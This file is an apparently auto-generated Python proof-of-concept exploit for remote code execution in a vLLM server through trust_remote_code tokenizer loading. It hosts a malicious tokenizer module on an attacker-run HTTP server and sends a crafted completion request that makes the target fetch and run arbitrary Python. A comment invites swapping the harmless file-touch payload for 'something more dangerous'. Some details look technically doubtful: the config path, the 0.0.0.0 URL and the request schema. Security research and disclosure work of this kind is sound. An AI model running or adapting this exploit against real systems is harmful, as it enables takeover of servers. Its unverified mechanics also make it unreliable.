#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: rce-016
# Sink: get_model
# Auto-generated — run with: python3 rce_get_tokenizer_function_tokenizer_get_model.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for vllm-project-vllm-7193774 RCE vulnerability.

This script demonstrates how an attacker can achieve remote code execution
by exploiting the `trust_remote_code=True` parameter in `AutoTokenizer.from_pretrained`
when a user-controlled LoRA path is passed to `get_lora_tokenizer`.

The exploit works by:
1. Creating a malicious tokenizer on a local HTTP server that executes arbitrary code
2. Sending a request to the vLLM server with a LoRA path pointing to our malicious tokenizer
3. The server downloads and executes the tokenizer code, achieving RCE

WARNING: This is for educational/research purposes only. Only use on systems you own.
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

# =============================================================================
# Configuration - Modify these as needed
# =============================================================================

# Target vLLM server (default: localhost:8000)
TARGET_HOST = "localhost"
TARGET_PORT = 8000

# Local server to host malicious tokenizer (default: 0.0.0.0:9999)
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9999

# Benign payload for demonstration - creates a file to prove code execution
# Change to something more dangerous for actual exploitation
PAYLOAD = "import os; os.system('touch /tmp/poc_success.txt')"

# =============================================================================
# Malicious Tokenizer Server
# =============================================================================

class MaliciousTokenizerHandler(BaseHTTPRequestHandler):
    """HTTP handler that serves a malicious tokenizer configuration."""
    
    def do_GET(self):
        """Handle GET requests - serve tokenizer files."""
        if self.path == "/":
            # Serve the main tokenizer config
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            
            # Create a tokenizer config that will execute our payload
            config = {
                "model_type": "bert",
                "tokenizer_class": "BertTokenizer",
                "auto_map": {
                    "AutoTokenizer": ["custom_tokenizer", None]
                }
            }
            self.wfile.write(json.dumps(config).encode())
            
        elif self.path == "/custom_tokenizer.py":
            # Serve the malicious tokenizer code
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            
            # The tokenizer code that executes our payload when loaded
            malicious_code = f"""
# Malicious tokenizer for PoC
import os

# Execute the payload when this module is loaded
{PAYLOAD}

from transformers import BertTokenizer

class CustomTokenizer(BertTokenizer):
    pass
"""
            self.wfile.write(malicious_code.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


def start_malicious_server():
    """Start the HTTP server hosting the malicious tokenizer."""
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), MaliciousTokenizerHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Malicious tokenizer server started on {LISTEN_HOST}:{LISTEN_PORT}")
    return server


# =============================================================================
# Exploit Functions
# =============================================================================

def check_server_available(host, port, timeout=5):
    """Check if the target vLLM server is reachable."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception as e:
        print(f"[-] Error checking server: {e}")
        return False


def send_lora_request(host, port, lora_path, timeout=30):
    """
    Send a request to the vLLM server with a malicious LoRA path.
    
    This triggers the vulnerable code path:
    get_lora_tokenizer -> get_tokenizer -> AutoTokenizer.from_pretrained(trust_remote_code=True)
    """
    url = f"http://{host}:{port}/v1/completions"
    
    # Craft a request that uses LoRA with our malicious tokenizer
    payload = {
        "model": "default",
        "prompt": "Hello, world!",
        "max_tokens": 10,
        "lora": {
            "name": "malicious_lora",
            "path": lora_path,
            "rank": 8
        }
    }
    
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    
    try:
        print(f"[*] Sending exploit request to {url}")
        print(f"[*] Using malicious LoRA path: {lora_path}")
        
        with urllib.request.urlopen(req, timeout=timeout) as response:
            result = response.read().decode()
            print(f"[+] Server responded: {result[:200]}...")
            return True
            
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        if e.code == 422:
            print("[*] This is expected - the server may reject invalid LoRA configs")
            print("[*] The tokenizer code may still have been executed")
        return False
    except urllib.error.URLError as e:
        print(f"[-] Connection error: {e.reason}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


def verify_exploit():
    """Check if the payload was executed on the target."""
    # For this PoC, we check locally since we're demonstrating the concept
    # In a real scenario, you'd check the target system
    time.sleep(1)  # Give time for execution
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Payload executed! /tmp/poc_success.txt created")
        return True
    else:
        print("[-] Payload may not have executed (file not found locally)")
        print("[*] Note: The exploit runs on the vLLM server, not locally")
        return False


# =============================================================================
# Main Exploit Logic
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for vllm-project-vllm-7193774 RCE vulnerability"
    )
    parser.add_argument(
        "--target", 
        default=f"{TARGET_HOST}:{TARGET_PORT}",
        help="Target vLLM server (host:port)"
    )
    parser.add_argument(
        "--listen",
        default=f"{LISTEN_HOST}:{LISTEN_PORT}",
        help="Local server to host malicious tokenizer (host:port)"
    )
    parser.add_argument(
        "--payload",
        default=PAYLOAD,
        help="Python code to execute on the target"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify exploit by checking for /tmp/poc_success.txt"
    )
    
    args = parser.parse_args()
    
    # Parse target address
    try:
        target_host, target_port_str = args.target.split(":")
        target_port = int(target_port_str)
    except ValueError:
        print("[-] Invalid target format. Use host:port (e.g., localhost:8000)")
        sys.exit(1)
    
    # Parse listen address
    try:
        listen_host, listen_port_str = args.listen.split(":")
        listen_port = int(listen_port_str)
    except ValueError:
        print("[-] Invalid listen format. Use host:port (e.g., 0.0.0.0:9999)")
        sys.exit(1)
    
    # Update global payload
    global PAYLOAD
    PAYLOAD = args.payload
    
    print("=" * 60)
    print("vLLM RCE Exploit PoC")
    print("=" * 60)
    print(f"[*] Target: {target_host}:{target_port}")
    print(f"[*] Listen: {listen_host}:{listen_port}")
    print(f"[*] Payload: {PAYLOAD}")
    print()
    
    # Step 1: Check if target is available
    print("[*] Step 1: Checking if target server is available...")
    if not check_server_available(target_host, target_port):
        print("[-] Target server is not reachable!")
        print("[*] Make sure the vLLM server is running with --trust-remote-code")
        sys.exit(1)
    print("[+] Target server is reachable")
    
    # Step 2: Start malicious tokenizer server
    print("\n[*] Step 2: Starting malicious tokenizer server...")
    server = start_malicious_server()
    print(f"[+] Server started on {listen_host}:{listen_port}")
    
    # Step 3: Send exploit request
    print("\n[*] Step 3: Sending exploit request...")
    lora_path = f"http://{listen_host}:{listen_port}"
    success = send_lora_request(target_host, target_port, lora_path)
    
    # Step 4: Verify exploit
    print("\n[*] Step 4: Verifying exploit...")
    if args.verify:
        verify_exploit()
    else:
        print("[*] Skipping verification (use --verify to check)")
        print("[*] Check if /tmp/poc_success.txt exists on the target")
    
    # Cleanup
    print("\n[*] Cleaning up...")
    server.shutdown()
    print("[+] Done")
    
    if success:
        print("\n[!] Exploit completed - check target for code execution")
    else:
        print("\n[!] Exploit may have partially succeeded")
        print("[*] The tokenizer code might have executed even if the request failed")


if __name__ == "__main__":
    main()
